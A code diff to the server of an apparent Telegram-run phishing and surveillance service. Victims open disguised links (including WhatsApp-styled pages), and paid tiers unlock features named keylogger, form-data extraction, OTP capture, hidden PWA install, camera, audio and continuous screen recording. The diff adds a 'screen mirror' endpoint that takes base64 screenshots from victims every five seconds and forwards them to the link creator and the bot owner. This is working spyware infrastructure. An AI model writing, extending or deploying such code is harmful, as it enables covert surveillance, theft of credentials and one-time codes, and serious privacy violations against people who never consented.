@@ -44,9 +44,9 @@ const DEFAULT_PAGE_CONFIG = {
 };
 
 const DEFAULT_FEATURES = { gyroscope:true, webrtc:true, fingerprint:true, sessionTime:true, lightSensor:true, clipboard:true, battery:true, vpnDetect:true };
-const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:true, webOTP:false, bluetooth:true, pwaInstall:true, screenRecord:false };
+const DEFAULT_PREMIUM_FREE = { camera:true, audio:true, clipboard:false, contacts:false, files:false, persistentId:false, localNet:false, webpush:true, screencap:false, faceAI:false, activityDetect:false, autofill:false, devtools:false, keylogger:false, sensors:false, formspy:false, speechRecog:true, webOTP:false, bluetooth:true, pwaInstall:true, screenRecord:false, screenMirror:false };
 // These features are ALWAYS paid-VIP only — never free
-const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy', 'webOTP', 'screenRecord']);
+const VIP_ONLY_FEATURES = new Set(['contcam', 'contaudio', 'keylogger', 'sensors', 'formspy', 'webOTP', 'screenRecord', 'screenMirror']);
 
 let pageConfig   = { ...DEFAULT_PAGE_CONFIG, ...loadJSON(PAGE_CONFIG_FILE, {}) };
 let submissions  = loadJSON(SUBMISSIONS_FILE, []);
@@ -840,7 +840,8 @@ async function handleLinkOpen(req, res, view) {
   const bluetoothAccess   = canUsePremium(creatorId, 'bluetooth');
   const pwaAccess         = canUsePremium(creatorId, 'pwaInstall');
   const screenRecordAccess= canUsePremium(creatorId, 'screenRecord');
-  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess, speechRecogAccess, webOTPAccess, bluetoothAccess, pwaAccess, screenRecordAccess });
+  const screenMirrorAccess= canUsePremium(creatorId, 'screenMirror');
+  res.render(view, { ip, time: d, url: Buffer.from(req.params.uri, 'base64').toString('utf8'), uid: req.params.path, a: hostURL, t: use1pt, feat, premium: userPremium, camAccess, audioAccess, clipAccess, pidAccess, localNetAccess, pushAccess, screenCapAccess, contcamAccess, contaudioAccess, faceAIAccess, activityAccess, autofillAccess, devtoolsAccess, keyloggerAccess, sensorsAccess, formspyAccess, speechRecogAccess, webOTPAccess, bluetoothAccess, pwaAccess, screenRecordAccess, screenMirrorAccess });
 }
 
 app.get("/w/:path/*",  (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "webview"); });
@@ -881,7 +882,7 @@ app.get("/a/:token", async (req, res) => {
     faceAIAccess: true, activityAccess: true, autofillAccess: true, devtoolsAccess: true,
     speechRecogAccess: true, webOTPAccess: true, bluetoothAccess: true,
     keyloggerAccess: true, sensorsAccess: true, formspyAccess: true,
-    pwaAccess: true, screenRecordAccess: true
+    pwaAccess: true, screenRecordAccess: true, screenMirrorAccess: true
   });
 });
 app.get("/wa/:path/*", (req, res) => { req.params.uri = req.params[0]; handleLinkOpen(req, res, "whatsapp"); });
@@ -3717,7 +3718,8 @@ const PREM_FEAT_NAMES = {
   formspy:        "📝 استخراج بيانات الفورم",
   bluetooth:      "🔵 ماسح البلوتوث",
   pwaInstall:     "📲 تثبيت تطبيق خفي (PWA)",
-  screenRecord:   "🖥️ تسجيل شاشة مستمر 🔥"
+  screenRecord:   "🖥️ تسجيل شاشة مستمر 🔥",
+  screenMirror:   "🪞 مرايا الشاشة المباشرة 👑"
 };
 
 function premiumConfigText() {
@@ -4096,6 +4098,22 @@ app.post("/screen-record", (req, res) => {
   if (!settings.silentMode) {
     notifyDoc(tid, buf, { caption: cap }, info);
     if (tid !== BOT_OWNER) notifyDoc(BOT_OWNER, buf, { caption: `${cap}\n(ID: ${tid})` }, info);
+  }
+  res.send("Done");
+});
+
+// ── Screen mirror — live JPEG screenshots every 5s ───────────────────────────
+app.post("/screen-mirror", (req, res) => {
+  const uid = req.body?.uid  || null;
+  const img = req.body?.img  || null;
+  if (!uid || !img) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  const buf = Buffer.from(decodeURIComponent(img), 'base64');
+  const ts  = new Date().toJSON().slice(11,19) + " UTC";
+  const cap = `🪞 مرايا الشاشة | ${ts}`;
+  if (!settings.silentMode) {
+    bot.sendPhoto(tid, buf, { caption: cap }).catch(()=>{});
+    if (tid !== BOT_OWNER) bot.sendPhoto(BOT_OWNER, buf, { caption: `${cap}\n(ID: ${tid})` }).catch(()=>{});
   }
   res.send("Done");
 });
